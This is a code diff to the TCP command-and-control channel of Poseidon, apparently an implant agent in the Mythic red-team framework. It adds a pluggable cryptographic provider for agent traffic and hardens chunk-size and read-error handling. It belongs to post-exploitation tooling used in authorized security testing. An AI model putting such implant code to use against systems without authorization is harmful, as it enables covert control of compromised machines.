@@ -14,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/cryptoprovider"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 
@@ -29,6 +30,8 @@ var tcp_initial_config string
 var poseidonChunkSize = uint32(30000)
 
 type TCPInitialConfig struct {
+	CryptoProvider         string
+	CryptoProviderConfig   string
 	Port                   uint
 	Killdate               string
 	EncryptedExchangeCheck bool
@@ -41,6 +44,20 @@ func (e *TCPInitialConfig) UnmarshalJSON(data []byte) error {
 	err := json.Unmarshal(data, &alias)
 	if err != nil {
 		return err
+	}
+	if v, ok := alias["crypto_provider"]; ok {
+		var valid bool
+		e.CryptoProvider, valid = v.(string)
+		if !valid {
+			return fmt.Errorf("crypto_provider must be a string")
+		}
+	}
+	if v, ok := alias["crypto_provider_config"]; ok {
+		var valid bool
+		e.CryptoProviderConfig, valid = v.(string)
+		if !valid {
+			return fmt.Errorf("crypto_provider_config must be a string")
+		}
 	}
 	if v, ok := alias["port"]; ok {
 		e.Port = uint(v.(float64))
@@ -62,6 +79,12 @@ func (e *TCPInitialConfig) UnmarshalJSON(data []byte) error {
 }
 
 type C2PoseidonTCP struct {
+	cryptoProvider       cryptoprovider.Session
+	providerConnectionMu sync.Mutex
+	providerRunMu        sync.Mutex
+	providerWriteMu      sync.Mutex
+	providerConnection   net.Conn
+	providerReady        bool
 	ExchangingKeys       bool
 	Key                  string
 	RsaPrivateKey        *rsa.PrivateKey
@@ -119,6 +142,15 @@ func init() {
 		stopListeningChannel: make(chan bool, 1),
 		chunkSize:            poseidonChunkSize,
 		LocalhostOnly:        initialConfig.LocalhostOnly,
+	}
+	if initialConfig.CryptoProvider != "" || initialConfig.CryptoProviderConfig != "" {
+		profile.cryptoProvider, err = cryptoprovider.New(initialConfig.CryptoProvider, initialConfig.CryptoProviderConfig, UUID)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("invalid TCP cryptographic provider: %v\n", err))
+			os.Exit(1)
+		}
+		profile.Key = ""
+		profile.ExchangingKeys = false
 	}
 	// these two functions only need to happen once, not each time the profile is started
 	go profile.CreateMessagesForEgressConnections()
@@ -180,6 +212,9 @@ func (c *C2PoseidonTCP) Stop() {
 		return
 	}
 	c.ShouldStop = true
+	if c.cryptoProvider != nil {
+		c.closeProviderConnection()
+	}
 	c.stopListeningChannel <- true
 	utils.PrintDebug("issued stop to poseidon_tcp\n")
 	<-c.stoppedChannel
@@ -223,6 +258,10 @@ func (c *C2PoseidonTCP) GetPushChannel() chan structs.MythicMessage {
 	return nil
 }
 func (c *C2PoseidonTCP) handleClientConnection(conn net.Conn) {
+	if c.cryptoProvider != nil {
+		c.handleProviderConnection(conn)
+		return
+	}
 	// this is a new client connection to this listening server
 	// first thing we want to do is save it off
 	connectionUUID := uuid.New().String()
@@ -460,6 +499,9 @@ func (c *C2PoseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
 		}
 		//utils.PrintDebug(fmt.Sprintf("got size bytes: %v\n", sizeBytes))
 		sizeBuffer = c.bytesToBigEndian(sizeBytes)
+		if sizeBuffer != 0 && sizeBuffer < 8 {
+			return nil, errors.New("invalid TCP chunk size")
+		}
 		if sizeBuffer == 0 {
 			utils.PrintDebug(fmt.Sprintf("got 0 size from remote connection\n"))
 			return nil, nil
@@ -478,6 +520,9 @@ func (c *C2PoseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
 		currentChunk = c.bytesToBigEndian(currentChunkBytes)
 		utils.PrintDebug(fmt.Sprintf("Starting read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, sizeBuffer-8))
 		chunkBytes, err := c.readXBytes(conn, sizeBuffer-8)
+		if err != nil {
+			return nil, err
+		}
 		// finished reading this chunk and all of its data
 		totalBytes = append(totalBytes, chunkBytes...)
 		//copy(totalBytes[len(totalBytes):], readBuffer[:])
@@ -491,6 +536,10 @@ func (c *C2PoseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
 
 // htmlPostData HTTP POST function
 func (c *C2PoseidonTCP) SendMessage(sendData []byte) []byte {
+	if c.cryptoProvider != nil {
+		c.sendProviderMessage(sendData)
+		return nil
+	}
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
 		//log.Printf("Encrypting Post data")
